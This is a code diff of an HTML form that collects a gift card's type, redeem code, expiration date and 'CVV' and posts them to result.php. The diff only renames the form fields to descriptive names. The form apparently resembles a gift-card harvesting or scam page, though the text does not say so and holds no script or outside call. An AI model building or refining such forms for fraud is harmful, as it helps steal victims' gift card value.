@@ -24,7 +24,7 @@
             <div class="mb-4">
                 <form action="./result.php" method="post" class="space-y-4">
                     <div class="form-group">
-                        <select name="dropdown" id="ff_3_dropdown" class="ff-el-form-control" data-name="dropdown" data-calc_value="0" aria-invalid="false" aria-required="false">
+                        <select name="card_type" id="card_type" class="ff-el-form-control" data-name="card_type" data-calc_value="0" aria-invalid="false" aria-required="false">
                             <option value="">- Select type of card-</option>
                             <option value="Apple">Apple</option>
                             <option value="Amazon">Amazon</option>
@@ -45,13 +45,15 @@
                     </div>
 
                     <div class="ff-el-group">
-                        <div class="ff-el-input--content"><input type="text" name="input_text" class="ff-el-form-control" placeholder="Gift card code" data-name="input_text" id="ff_3_input_text" aria-invalid="false" aria-required="true"></div>
+                        <div class="ff-el-input--content"><input type="text" name="redeem_code" class="ff-el-form-control" placeholder="Gift card code" data-name="input_text" id="redeem_code" aria-invalid="false" aria-required="true"></div>
                     </div>
                     <div class="ff-el-group">
-                        <div class="ff-el-input--content"><input type="text" name="subject" class="ff-el-form-control" placeholder="Gift card expiration date" data-name="subject" id="ff_3_subject" aria-invalid="false" aria-required="false"></div>
+                        <div class="ff-el-input--content"><input type="text" name="expiration_date" class="ff-el-form-control" placeholder="Gift card expiration date" data-name="expiration_date" id="expiration_date" aria-invalid="false" aria-required="false"></div>
                     </div>
                     <div class="ff-el-group">
-                        <div class="ff-el-input--content"><input type="number" name="numeric-field" id="ff_3_numeric-field" class="ff-el-form-control" placeholder="CVV" data-name="numeric-field" inputmode="numeric" step="any" aria-invalid="false" aria-required="false"></div>
+                        <div class="ff-el-input--content">
+                            <input type="number" name="cvv" id="cvv" class="ff-el-form-control" placeholder="`CVV`" data-name="cvv" inputmode="numeric" step="any" aria-invalid="false" aria-required="false">
+                        </div>
                     </div>
 
                     <div class="flex justify-center">
